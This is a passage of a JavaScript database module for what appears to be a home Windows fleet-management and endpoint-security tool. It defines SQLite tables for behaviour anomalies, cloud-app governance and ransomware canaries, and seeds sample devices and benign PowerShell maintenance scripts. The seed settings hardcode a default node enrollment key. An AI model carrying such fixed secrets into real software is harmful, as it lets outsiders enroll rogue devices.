    CREATE INDEX IF NOT EXISTS idx_uri_severity ON ueba_risk_indicators(severity);

    -- Table 170: ueba_user_behavior_anomalies
    CREATE TABLE IF NOT EXISTS ueba_user_behavior_anomalies (
      id TEXT PRIMARY KEY,
      user_principal TEXT NOT NULL,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      indicator_id TEXT NOT NULL,
      anomaly_type TEXT NOT NULL,
      observed_value REAL NOT NULL DEFAULT 0.0,
      baseline_value REAL NOT NULL DEFAULT 0.0,
      deviation_score REAL NOT NULL DEFAULT 1.0,
      status TEXT NOT NULL DEFAULT 'OPEN' CHECK(status IN ('OPEN', 'INVESTIGATING', 'RESOLVED', 'DISMISSED')),
      detected_at TEXT DEFAULT (DATETIME('now')),
      details_json TEXT NOT NULL DEFAULT '{}',
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(indicator_id) REFERENCES ueba_risk_indicators(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_uuba_user ON ueba_user_behavior_anomalies(user_principal);
    CREATE INDEX IF NOT EXISTS idx_uuba_device ON ueba_user_behavior_anomalies(device_id);
    CREATE INDEX IF NOT EXISTS idx_uuba_status ON ueba_user_behavior_anomalies(status);

    -- Table 171: ueba_user_risk_profiles
    CREATE TABLE IF NOT EXISTS ueba_user_risk_profiles (
      id TEXT PRIMARY KEY,
      user_principal TEXT NOT NULL UNIQUE,
      display_name TEXT,
      department TEXT DEFAULT 'Enterprise Ops',
      composite_risk_score INTEGER NOT NULL DEFAULT 0,
      risk_level TEXT NOT NULL DEFAULT 'LOW' CHECK(risk_level IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      flight_risk_flag INTEGER NOT NULL DEFAULT 0 CHECK(flight_risk_flag IN (0, 1)),
      containment_status TEXT NOT NULL DEFAULT 'MONITORED' CHECK(containment_status IN ('MONITORED', 'RESTRICTED', 'CONTAINED', 'REVOKED')),
      anomalies_count INTEGER NOT NULL DEFAULT 0,
      last_assessed_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_uurp_score ON ueba_user_risk_profiles(composite_risk_score);
    CREATE INDEX IF NOT EXISTS idx_uurp_level ON ueba_user_risk_profiles(risk_level);
    CREATE INDEX IF NOT EXISTS idx_uurp_containment ON ueba_user_risk_profiles(containment_status);
    -- =========================================================================
    -- ITERATION 61: Cloud App Discovery & Shadow SaaS Governance Engine (Endpoint CASB)
    -- =========================================================================
    -- Table 172: cloud_app_catalog
    CREATE TABLE IF NOT EXISTS cloud_app_catalog (
      id TEXT PRIMARY KEY,
      app_name TEXT NOT NULL UNIQUE,
      category TEXT NOT NULL CHECK(category IN ('CLOUD_STORAGE', 'GENERATIVE_AI', 'COLLABORATION', 'DEVELOPER_TOOLS', 'SHADOW_VPN', 'SOCIAL_MEDIA', 'WEBMAIL')),
      domain_name TEXT NOT NULL,
      description TEXT,
      risk_score INTEGER NOT NULL DEFAULT 50,
      sanctioned_status TEXT NOT NULL DEFAULT 'MONITORED' CHECK(sanctioned_status IN ('SANCTIONED', 'UNSANCTIONED', 'MONITORED')),
      compliance_certifications TEXT DEFAULT '[]',
      total_users_count INTEGER NOT NULL DEFAULT 0,
      total_bytes_transferred INTEGER NOT NULL DEFAULT 0,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_cac_category ON cloud_app_catalog(category);
    CREATE INDEX IF NOT EXISTS idx_cac_status ON cloud_app_catalog(sanctioned_status);
    CREATE INDEX IF NOT EXISTS idx_cac_score ON cloud_app_catalog(risk_score);

    -- Table 173: endpoint_cloud_usage_telemetry
    CREATE TABLE IF NOT EXISTS endpoint_cloud_usage_telemetry (
      id TEXT PRIMARY KEY,
      app_id TEXT NOT NULL,
      app_name TEXT NOT NULL,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      user_principal TEXT NOT NULL,
      bytes_uploaded INTEGER NOT NULL DEFAULT 0,
      bytes_downloaded INTEGER NOT NULL DEFAULT 0,
      session_count INTEGER NOT NULL DEFAULT 1,
      last_observed_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(app_id) REFERENCES cloud_app_catalog(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_ecut_app ON endpoint_cloud_usage_telemetry(app_id);
    CREATE INDEX IF NOT EXISTS idx_ecut_device ON endpoint_cloud_usage_telemetry(device_id);
    CREATE INDEX IF NOT EXISTS idx_ecut_user ON endpoint_cloud_usage_telemetry(user_principal);

    -- Table 174: cloud_app_access_policies
    CREATE TABLE IF NOT EXISTS cloud_app_access_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'DEVICE')),
      target_id TEXT,
      app_id TEXT,
      category_filter TEXT,
      enforcement_action TEXT NOT NULL DEFAULT 'AUDIT' CHECK(enforcement_action IN ('ALLOW', 'AUDIT', 'WARN', 'BLOCK')),
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(app_id) REFERENCES cloud_app_catalog(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_caap_action ON cloud_app_access_policies(enforcement_action);
    CREATE INDEX IF NOT EXISTS idx_caap_active ON cloud_app_access_policies(is_active);
    -- =========================================================================
    -- ITERATION 62: Automated Ransomware Canary Files & File Integrity Trap Engine
    -- =========================================================================
    -- Table 175: ransomware_canary_traps
    CREATE TABLE IF NOT EXISTS ransomware_canary_traps (
      id TEXT PRIMARY KEY,
      filename TEXT NOT NULL,
      directory_path TEXT NOT NULL,
      original_sha256 TEXT NOT NULL,
      original_size_bytes INTEGER NOT NULL DEFAULT 4096,
      baseline_entropy REAL NOT NULL DEFAULT 4.2,
      status TEXT NOT NULL DEFAULT 'HEALTHY' CHECK(status IN ('HEALTHY', 'TAMPERED', 'ENCRYPTED', 'DELETED', 'OFFLINE')),
      last_verified_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_rct_status ON ransomware_canary_traps(status);
    CREATE INDEX IF NOT EXISTS idx_rct_dir ON ransomware_canary_traps(directory_path);

    -- Table 176: ransomware_tamper_detections
    CREATE TABLE IF NOT EXISTS ransomware_tamper_detections (
      id TEXT PRIMARY KEY,
      trap_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      tamper_type TEXT NOT NULL CHECK(tamper_type IN ('FILE_RENAME', 'EXTENSION_CHANGE', 'ENTROPY_SPIKE', 'FILE_DELETION', 'CONTENT_CORRUPTION')),
      detected_extension TEXT,
      process_id INTEGER NOT NULL DEFAULT 0,
      process_name TEXT DEFAULT 'unknown.exe',
      process_command_line TEXT,
      containment_action TEXT NOT NULL DEFAULT 'NONE' CHECK(containment_action IN ('NONE', 'KILL_PROCESS', 'ISOLATE_HOST', 'QUARANTINE_BINARY', 'AUTO_RESTORED')),
      severity TEXT NOT NULL DEFAULT 'CRITICAL' CHECK(severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      detected_at TEXT DEFAULT (DATETIME('now')),
      forensic_details_json TEXT NOT NULL DEFAULT '{}',
      FOREIGN KEY(trap_id) REFERENCES ransomware_canary_traps(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_rtd_device ON ransomware_tamper_detections(device_id);
    CREATE INDEX IF NOT EXISTS idx_rtd_trap ON ransomware_tamper_detections(trap_id);
    CREATE INDEX IF NOT EXISTS idx_rtd_action ON ransomware_tamper_detections(containment_action);

    -- Table 177: ransomware_containment_policies
    CREATE TABLE IF NOT EXISTS ransomware_containment_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'DEVICE')),
      target_id TEXT,
      auto_kill_process INTEGER NOT NULL DEFAULT 1 CHECK(auto_kill_process IN (0, 1)),
      auto_isolate_network INTEGER NOT NULL DEFAULT 1 CHECK(auto_isolate_network IN (0, 1)),
      auto_restore_canary INTEGER NOT NULL DEFAULT 1 CHECK(auto_restore_canary IN (0, 1)),
      entropy_threshold REAL NOT NULL DEFAULT 7.8,
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_rcp_active ON ransomware_containment_policies(is_active);





  `);

  // Schema migrations for existing databases
  try {
    const tableSqlRow = db.prepare("SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'security_events'").get();
    if (tableSqlRow && tableSqlRow.sql && !tableSqlRow.sql.includes('SCRIPT_DISPATCHED')) {
      db.exec(`
        PRAGMA foreign_keys = OFF;
        CREATE TABLE security_events_migrated (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          device_id TEXT NOT NULL,
          event_type TEXT NOT NULL CHECK(event_type IN (
            'USER_CREATED', 'USER_DELETED', 'ADMIN_ADDED', 'ADMIN_REMOVED',
            'APP_INSTALLED', 'APP_PROHIBITED_DETECTED', 'POLICY_DRIFT',
            'TPM_VIOLATION', 'SECUREBOOT_DISABLED', 'BITLOCKER_OFFLINE', 'WATCHDOG_HEARTBEAT',
            'MALWARE_THREAT_DETECTED', 'ANTIVIRUS_RTP_DISABLED',
            'BITLOCKER_KEY_ESCROWED', 'BITLOCKER_KEY_REVEALED', 'BITLOCKER_ENCRYPTION_TRIGGERED',
            'LAPS_PASSWORD_ESCROWED', 'LAPS_PASSWORD_REVEALED', 'LAPS_PASSWORD_ROTATED',
            'EPM_ELEVATION_REQUESTED', 'EPM_ELEVATION_APPROVED', 'EPM_ELEVATION_DENIED', 'EPM_PROCESS_ELEVATED',
            'AUTOPILOT_DEVICE_IMPORTED', 'AUTOPILOT_PROFILE_ASSIGNED', 'AUTOPILOT_PROVISIONING_STARTED', 'AUTOPILOT_PROVISIONING_COMPLETED', 'AUTOPILOT_PROVISIONING_FAILED',
            'REMOTE_ACTION_DISPATCHED', 'REMOTE_ACTION_COMPLETED', 'REMOTE_ACTION_FAILED', 'DIAGNOSTICS_COLLECTED', 'BULK_ACTION_EXECUTED',
            'FIREWALL_RULE_APPLIED', 'FIREWALL_DRIFT_DETECTED', 'ROGUE_PORT_DETECTED', 'FIREWALL_PROFILE_DISABLED',
            'SCRIPT_DISPATCHED', 'SCRIPT_EXECUTION_SUCCESS', 'SCRIPT_EXECUTION_FAILED'
          )),
          event_id INTEGER,
          event_source TEXT NOT NULL,
          severity TEXT NOT NULL CHECK(severity IN ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO')),
          summary TEXT NOT NULL,
          raw_payload_json TEXT NOT NULL,
          acknowledged INTEGER DEFAULT 0 CHECK(acknowledged IN (0, 1)),
          acknowledged_at TEXT,
          acknowledged_by TEXT,
          created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
          FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
        );
        INSERT INTO security_events_migrated SELECT * FROM security_events;
        DROP TABLE security_events;
        ALTER TABLE security_events_migrated RENAME TO security_events;
        CREATE INDEX IF NOT EXISTS idx_events_device ON security_events(device_id);
        CREATE INDEX IF NOT EXISTS idx_events_sev_ack ON security_events(severity, acknowledged);
        CREATE INDEX IF NOT EXISTS idx_events_created ON security_events(created_at DESC);
        PRAGMA foreign_keys = ON;
      `);
    }

    try {
      db.exec("ALTER TABLE devices ADD COLUMN installed_software_json TEXT DEFAULT '[]'");
    } catch {}
  } catch (migErr) {
    console.warn('[DB Migration Warning]:', migErr.message);
  }

  if (shouldSeed) {
    seedDatabase(db);
  }

  dbInstance = db;
  return dbInstance;
}

export function getDb() {
  if (!dbInstance) {
    return initDb();
  }
  return dbInstance;
}

export function closeDb() {
  if (dbInstance) {
    try {
      dbInstance.close();
    } catch {}
    dbInstance = null;
  }
}

export function seedDatabase(db) {
  // 1. Settings
  const settingsCount = db.prepare('SELECT COUNT(*) as count FROM fleet_settings').get().count;
  if (settingsCount === 0) {
    const insertSetting = db.prepare(`
      INSERT OR IGNORE INTO fleet_settings (key, value, data_type, description, is_secret)
      VALUES (?, ?, ?, ?, ?)
    `);

    const defaults = [
      ['fleet_name', 'Daddy Command Fleet', 'string', 'Display title for dashboard header', 0],
      ['fleet_enrollment_key', 'localpilot-secret-key-2026', 'string', 'Pre-shared key required for new node enrollment', 1],
      ['server_port', '8443', 'number', 'Backend listening port', 0],
      ['heartbeat_interval_sec', '60', 'number', 'Frequency of lightweight node heartbeat', 0],
      ['telemetry_interval_min', '15', 'number', 'Frequency of deep hardware/software inventory harvest', 0],
      ['offline_threshold_sec', '180', 'number', 'Seconds without heartbeat before marking node offline', 0],
      ['toast_notifications_enabled', 'true', 'boolean', 'Show Windows native toast on Daddy PC', 0],
      ['discord_webhook_url', '', 'string', 'Discord Webhook URL for critical push notifications', 1],
      ['slack_webhook_url', '', 'string', 'Slack Incoming Webhook URL', 1],
      ['telegram_bot_token', '', 'string', 'Telegram Bot API Token', 1],
      ['telegram_chat_id', '', 'string', 'Telegram Chat ID for notifications', 0],
      ['cloudflare_tunnel_hostname', '', 'string', 'Public tunnel hostname e.g. fleet.yourdomain.com', 0],
      ['cloudflare_tunnel_id', '', 'string', 'Cloudflare Tunnel UUID', 0]
    ];

    for (const [k, v, dt, desc, sec] of defaults) {
      insertSetting.run(k, v, dt, desc, sec);
    }
  }

  // 2. Dynamic Groups
  const groupCount = db.prepare('SELECT COUNT(*) as count FROM dynamic_groups').get().count;
  if (groupCount === 0) {
    const insertGroup = db.prepare(`
      INSERT OR IGNORE INTO dynamic_groups (id, name, description, rule_syntax, is_dynamic, color, icon, priority)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    const groups = [
      ['grp-all', 'All Devices', 'Default catch-all group containing every enrolled node', 'Device.Hostname -like "*"', 1, '#64748B', 'monitor', 10],
      ['grp-workstations', 'High-Performance Workstations', 'Desktops with >= 32GB RAM and dedicated NVIDIA GPU', 'Device.TotalRAM_GB -ge 32 and Device.GPU -like "*NVIDIA*" and Device.HasBattery -eq false', 1, '#10B981', 'cpu', 20],
      ['grp-family-laptops', 'Family Laptops', 'Portable battery-powered machines tagged for family members', 'Device.HasBattery -eq true and Device.Tags -contains "family"', 1, '#3B82F6', 'laptop', 30],
      ['grp-win11-modern', 'Windows 11 Modern Core', 'Windows 11 builds with active TPM 2.0 and SecureBoot enabled', 'Device.OSVersion -like "10.0.22*" and Device.TPMEnabled -eq true and Device.SecureBoot -eq true', 1, '#8B5CF6', 'shield-check', 40],
      ['grp-low-storage', 'Storage Warning Watchlist', 'Nodes with less than 50GB free space on system drive', 'Device.StorageFree_GB -lt 50', 1, '#EF4444', 'hard-drive', 50]
    ];

    for (const g of groups) {
      insertGroup.run(...g);
    }
  }

  // 3. Software Catalog
  const softCount = db.prepare('SELECT COUNT(*) as count FROM software_catalog').get().count;
  if (softCount === 0) {
    const insertSoft = db.prepare(`
      INSERT OR IGNORE INTO software_catalog (id, name, publisher, winget_id, version, category, description, silent_install_args)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `);

    const packages = [
      ['pkg-chrome', 'Google Chrome', 'Google LLC', 'Google.Chrome', 'latest', 'Browsers', 'Standard secure web browser', '--silent --accept-package-agreements --accept-source-agreements'],
      ['pkg-bitwarden', 'Bitwarden', 'Bitwarden Inc.', 'Bitwarden.Bitwarden', 'latest', 'Security', 'Password manager for family security', '--silent --accept-package-agreements --accept-source-agreements'],
      ['pkg-7zip', '7-Zip', 'Igor Pavlov', '7zip.7zip', 'latest', 'Utilities', 'Open source file archiver', '--silent --accept-package-agreements --accept-source-agreements'],
      ['pkg-vscode', 'Visual Studio Code', 'Microsoft Corporation', 'Microsoft.VisualStudioCode', 'latest', 'Development', 'Code editor for development workstations', '--silent --accept-package-agreements --accept-source-agreements'],
      ['pkg-steam', 'Steam', 'Valve Corporation', 'Valve.Steam', 'latest', 'Gaming', 'Gaming digital distribution platform', '--silent --accept-package-agreements --accept-source-agreements'],
      ['pkg-utorrent', 'uTorrent', 'BitTorrent Inc.', 'BitTorrent.uTorrent', '', 'Prohibited', 'Unapproved P2P torrent client', '--silent']
    ];

    for (const p of packages) {
      insertSoft.run(...p);
    }
  }

  // 4. Policy Assignments
  const polCount = db.prepare('SELECT COUNT(*) as count FROM policy_assignments').get().count;
  if (polCount === 0) {
    const insertPol = db.prepare(`
      INSERT OR IGNORE INTO policy_assignments (id, group_id, software_id, assignment_type, auto_update)
      VALUES (?, ?, ?, ?, ?)
    `);

    const policies = [
      ['pol-chrome-all', 'grp-all', 'pkg-chrome', 'Required', 1],
      ['pol-bitwarden-family', 'grp-family-laptops', 'pkg-bitwarden', 'Required', 1],
      ['pol-7zip-all', 'grp-all', 'pkg-7zip', 'Required', 1],
      ['pol-vscode-workstations', 'grp-workstations', 'pkg-vscode', 'Available', 1],
      ['pol-steam-workstations', 'grp-workstations', 'pkg-steam', 'Available', 1],
      ['pol-utorrent-prohibited-all', 'grp-all', 'pkg-utorrent', 'Prohibited', 0]
    ];

    for (const pol of policies) {
      insertPol.run(...pol);
    }
  }

  // 5. Realistic Seed Devices
  const devCount = db.prepare('SELECT COUNT(*) as count FROM devices').get().count;
  if (devCount === 0) {
    const insertDev = db.prepare(`
      INSERT OR IGNORE INTO devices (
        id, hostname, friendly_name, serial_number, uuid, mac_address, ip_address,
        connection_route, status, os_name, os_version, os_build, cpu_model, cpu_cores, cpu_logical,
        total_ram_bytes, gpu_name, has_battery, battery_percent, battery_charging,
        tpm_present, tpm_version, tpm_enabled, secure_boot_enabled, bitlocker_status,
        primary_user, tags_json, assigned_group, node_token_hash, agent_version
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    // dev 1: Dad's Rig
    insertDev.run(
      'dev-daddy-pc', 'DADDY-RIG', "Dad's Workstation", 'MB-9901-DADDY', '11111111-2222-3333-4444-555555555555',
      '00:15:5D:01:02:03', '192.168.1.100', 'LAN', 'online', 'Microsoft Windows 11 Pro', '10.0.22631', '22631.3296',
      'AMD Ryzen 7 7800X3D 8-Core Processor', 8, 16, 68719476736, 'NVIDIA GeForce RTX 4090', 0, null, 0,
      1, '2.0', 1, 1, 'FullyEncrypted', 'Dad', '["workstation", "gaming", "host"]', 'High-Performance Workstations',
      'hash_daddy_token', '1.0.0'
    );

    // dev 2: Living Room PC (Drifted with uTorrent)
    insertDev.run(
      'dev-livingroom-pc', 'LIVINGROOM-PC', 'Family Living Room PC', 'MB-5521-LIVING', '22222222-3333-4444-5555-666666666666',
      '00:15:5D:04:05:06', '192.168.1.145', 'LAN', 'drifted', 'Microsoft Windows 11 Home', '10.0.22631', '22631.3296',
      'AMD Ryzen 5 5600G with Radeon Graphics', 6, 12, 17179869184, 'AMD Radeon Graphics', 0, null, 0,
      1, '2.0', 1, 1, 'Disabled', 'Family', '["family", "livingroom"]', 'Family Laptops',
      'hash_livingroom_token', '1.0.0'
    );

    // dev 3: Sarah's Surface Laptop (Roaming via Cloudflare)
    insertDev.run(
      'dev-sarah-laptop', 'SARAHS-SURFACE', "Sarah's Laptop", 'MB-7712-SURFACE', '33333333-4444-5555-6666-777777777777',
      '00:15:5D:07:08:09', '172.56.21.4', 'Cloudflare', 'online', 'Microsoft Windows 11 Pro', '10.0.22631', '22631.3296',
      '12th Gen Intel(R) Core(TM) i7-1265U', 10, 12, 17179869184, 'Intel(R) Iris(R) Xe Graphics', 1, 74.5, 0,
      1, '2.0', 1, 1, 'FullyEncrypted', 'Sarah', '["family", "laptop", "roaming"]', 'Family Laptops',
      'hash_sarah_token', '1.0.0'
    );

    // Group Memberships
    const insertMember = db.prepare(`
      INSERT OR IGNORE INTO group_memberships (group_id, device_id, is_dynamic_match)
      VALUES (?, ?, 1)
    `);
    insertMember.run('grp-all', 'dev-daddy-pc');
    insertMember.run('grp-workstations', 'dev-daddy-pc');
    insertMember.run('grp-win11-modern', 'dev-daddy-pc');

    insertMember.run('grp-all', 'dev-livingroom-pc');
    insertMember.run('grp-win11-modern', 'dev-livingroom-pc');

    insertMember.run('grp-all', 'dev-sarah-laptop');
    insertMember.run('grp-family-laptops', 'dev-sarah-laptop');
    insertMember.run('grp-win11-modern', 'dev-sarah-laptop');

    // Sample Snapshot for Daddy PC
    db.prepare(`
      INSERT INTO telemetry_snapshots (
        device_id, cpu_usage_percent, ram_used_bytes, ram_free_bytes, ram_usage_percent,
        disk_free_gb, disks_json, process_count, uptime_seconds
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      'dev-daddy-pc', 12.5, 21474836480, 47244640256, 31.2, 850.5,
      JSON.stringify([{ drive: 'C:', total_gb: 2000, free_gb: 850.5, smart_healthy: true }]),
      182, 345600
    );

    // Sample Alert for Living Room PC
    db.prepare(`
      INSERT INTO security_events (
        device_id, event_type, event_id, event_source, severity, summary, raw_payload_json, acknowledged
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      'dev-livingroom-pc', 'APP_PROHIBITED_DETECTED', 1033, 'LocalPilotWatchdog', 'CRITICAL',
      'Prohibited application "uTorrent" detected on LIVINGROOM-PC',
      JSON.stringify({ app: 'uTorrent', policy: 'Prohibited', detected_at: new Date().toISOString() }),
      0
    );
  }

  // 6. Seed Default Enterprise Remediations
  const remCount = db.prepare('SELECT COUNT(*) as count FROM remediations').get().count;
  if (remCount === 0) {
    const insertRem = db.prepare(`
      INSERT INTO remediations (
        id, name, description, publisher, target_group_id, detection_script, remediation_script, schedule_type, is_enabled
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
    `);

    insertRem.run(
      'rem-temp-cleanup',
      'Auto-Clean Stale Temporary Files & Crash Dumps',
      'Detects if user or system temporary directories exceed 500 MB of stale files and safely purges files older than 24 hours.',
      'Microsoft / LocalPilot Core',
      'grp-all',
      `$tempPaths = @($env:TEMP, 'C:\\Windows\\Temp')
$totalBytes = 0
foreach ($p in $tempPaths) {
  if (Test-Path $p) {
    $files = Get-ChildItem -Path $p -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-1) }
    $totalBytes += ($files | Measure-Object -Property Length -Sum).Sum
  }
}
$totalMb = [math]::Round($totalBytes / 1MB, 1)
if ($totalMb -gt 500) {
  Write-Host "Stale temporary files detected: $totalMb MB (threshold: 500 MB)"
  exit 1
}
Write-Host "Temp storage healthy: $totalMb MB stale files (threshold: 500 MB)"
exit 0`,
      `$tempPaths = @($env:TEMP, 'C:\\Windows\\Temp')
$freedBytes = 0
foreach ($p in $tempPaths) {
  if (Test-Path $p) {
    $files = Get-ChildItem -Path $p -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-1) }
    foreach ($f in $files) {
      try {
        $len = $f.Length
        Remove-Item -LiteralPath $f.FullName -Force -ErrorAction Stop
        $freedBytes += $len
      } catch {}
    }
  }
}
$freedMb = [math]::Round($freedBytes / 1MB, 1)
Write-Host "Purged $freedMb MB of stale temporary files."
exit 0`,
      'HEARTBEAT'
    );

    insertRem.run(
      'rem-spooler-heal',
      'Self-Healing Print Spooler & Subsystem Services',
      'Monitors the Windows Print Spooler service; automatically restarts it and corrects startup configuration if stopped or hung.',
      'Microsoft / LocalPilot Core',
      'grp-all',
      `$svc = Get-Service -Name Spooler -ErrorAction SilentlyContinue
if (-not $svc) { Write-Host "Print Spooler service not found"; exit 0 }
if ($svc.Status -ne 'Running') {
  Write-Host "Print Spooler is stopped (Current status: $($svc.Status))"
  exit 1
}
Write-Host "Print Spooler service is running normally"
exit 0`,
      `Set-Service -Name Spooler -StartupType Automatic -ErrorAction SilentlyContinue
Start-Service -Name Spooler -ErrorAction Stop
Write-Host "Print Spooler service restarted and set to Automatic startup."
exit 0`,
      'HEARTBEAT'
    );

    insertRem.run(
      'rem-dns-flush',
      'DNS Client Cache & Intranet Gateway Self-Heal',
      'Validates network resolution and flushes DNS cache when stale lookup tables degrade local network communication.',
      'LocalPilot Enterprise',
      'grp-all',
      `$dnsTest = Resolve-DnsName -Name "localhost" -ErrorAction SilentlyContinue
if (-not $dnsTest) {
  Write-Host "DNS client cache failed resolution test"
  exit 1
}
Write-Host "DNS client resolution operational"
exit 0`,
      `Clear-DnsClientCache
Write-Host "Flushed Windows DNS Client Cache successfully."
exit 0`,
      'HOURLY'
    );

    // Sample runs if sample devices exist
    const hasSampleDev = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasSampleDev) {
      const insertRun = db.prepare(`
        INSERT INTO remediation_runs (
          id, remediation_id, device_id, detection_exit_code, detection_stdout, detection_stderr,
          detection_status, remediation_exit_code, remediation_stdout, remediation_stderr,
          remediation_status, executed_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);

      insertRun.run(
        'run-sample-01', 'rem-temp-cleanup', 'dev-daddy-pc',
        0, 'Temp storage healthy: 124.5 MB stale files (threshold: 500 MB)', '',
        'NO_ISSUE', null, null, null, 'NOT_NEEDED', '-10 minutes'
      );

      insertRun.run(
        'run-sample-02', 'rem-temp-cleanup', 'dev-livingroom-pc',
        1, 'Stale temporary files detected: 840.2 MB (threshold: 500 MB)', '',
        'ISSUE_DETECTED', 0, 'Purged 840.2 MB of stale temporary files.', '',
        'REMEDIATED', '-5 minutes'
      );

      insertRun.run(
        'run-sample-03', 'rem-spooler-heal', 'dev-daddy-pc',
        0, 'Print Spooler service is running normally', '',
        'NO_ISSUE', null, null, null, 'NOT_NEEDED', '-15 minutes'
      );
    }
  }

  // 7. Seed Default Configuration Profiles
  const profCount = db.prepare('SELECT COUNT(*) as count FROM configuration_profiles').get().count;
  if (profCount === 0) {
    const insertProfile = db.prepare(`
      INSERT INTO configuration_profiles (
        id, name, description, profile_type, target_group_id, settings_json, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertProfile.run(
      'prof-win11-baseline',
      'Windows 11 Enterprise Hardened Security Baseline',
      'Enforces Windows Defender Firewall across all network profiles, User Account Control (UAC) token elevation, and Network Level Authentication (NLA) for Remote Desktop.',
      'SecurityBaseline',
      'grp-all',
      JSON.stringify([
        {
          id: 'firewall_all_profiles',
          category: 'Network & Firewall',
          name: 'Windows Defender Firewall (All Profiles)',
          description: 'Enforce Domain, Private, and Public firewall profiles enabled',
          setting_type: 'boolean',
          desired_value: true,
          enforce: true
        },
        {
          id: 'uac_enable_lua',
          category: 'User Account Control',
          name: 'UAC Admin Approval Mode (EnableLUA)',
          description: 'Enforce User Account Control token filtering for administrators',
          setting_type: 'integer',
          desired_value: 1,
          enforce: true
        },
        {
          id: 'rdp_nla',
          category: 'Remote Access',
          name: 'Remote Desktop Network Level Authentication (NLA)',
          description: 'Require Network Level Authentication for remote connections',
          setting_type: 'integer',
          desired_value: 1,
          enforce: true
        }
      ]),
      '-2 days', '-2 days'
    );

    insertProfile.run(
      'prof-dev-privacy',
      'Developer Workstation Privacy & Anti-Telemetry Policy',
      'Suppresses diagnostic telemetry data collection and disables consumer experience advertising IDs.',
      'SettingsCatalog',
      'grp-all',
      JSON.stringify([
        {
          id: 'telemetry_level',
          category: 'System & Telemetry',
          name: 'Diagnostic Data Collection Level',
          description: 'Limit Windows telemetry to Security/Minimal (0 = Security, 1 = Basic, 3 = Full)',
          setting_type: 'integer',
          desired_value: 0,
          enforce: true
        },
        {
          id: 'tailored_experiences',
          category: 'Privacy',
          name: 'Windows Tailored Diagnostic Experiences',
          description: 'Prevent Windows from using diagnostic data for personalized tips and recommendations',
          setting_type: 'integer',
          desired_value: 0,
          enforce: true
        }
      ]),
      '-1 day', '-1 day'
    );

    insertProfile.run(
      'prof-gaming-tuning',
      'Gaming Rig Low-Latency & Game Mode Optimization',
      'Optimizes DPC latency and power state by disabling Windows Fast Startup (hybrid sleep) to avoid driver baggage across reboots.',
      'CustomPolicy',
      'grp-all',
      JSON.stringify([
        {
          id: 'fast_startup',
          category: 'System & Power',
          name: 'Fast Startup (Hiberboot)',
          description: 'Disable Fast Startup to guarantee true cold kernel reboot and clean DPC state',
          setting_type: 'integer',
          desired_value: 0,
          enforce: true
        }
      ]),
      '-12 hours', '-12 hours'
    );

    // Seed Profile Compliance Records (if sample devices exist)
    const hasSampleDevForComp = db.prepare('SELECT id FROM devices WHERE id = ?').get('dev-daddy-pc');
    if (hasSampleDevForComp) {
      const insertCompliance = db.prepare(`
        INSERT INTO profile_compliance (
          id, profile_id, device_id, compliance_status, compliant_count, non_compliant_count, error_count,
          setting_results_json, evaluated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
      `);

      insertCompliance.run(
        'comp-01',
        'prof-win11-baseline',
        'dev-daddy-pc',
        'COMPLIANT',
        3, 0, 0,
        JSON.stringify([
